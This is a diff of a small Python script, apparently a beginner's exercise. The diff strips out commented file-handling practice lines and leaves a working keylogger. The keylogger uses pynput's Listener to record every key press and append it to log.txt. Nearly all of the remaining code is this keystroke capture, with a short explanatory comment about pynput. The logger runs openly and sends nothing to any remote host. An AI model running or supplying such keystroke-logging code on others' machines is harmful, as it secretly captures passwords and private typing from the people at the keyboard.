@@ -1,17 +1,5 @@
 
-from pynput.keyboard import Listener
-#file = open("log.txt", "w")
-#file.write("yurrrr x 2")
-#file.close()
-# file = open("log.txt", "r")
-# filedata= file.read()
-# print(filedata)
-# file.close()
-
-# file = open("log.txt", "a")
-# file.write("\nyes I am")
-# file.close()
-           
+from pynput.keyboard import Listener          
 # w= writing
 # r= reading
 # a= appending
@@ -25,6 +13,5 @@ def writetofile(key) :
     with open("log.txt", 'a') as f:
         f.write(letter)
 #pynput is a package responsible for inpit streams IE how a computer interperts and listens to keystrokes and mouse cloicks
-
 with Listener(on_press=writetofile) as l:
     l.join()
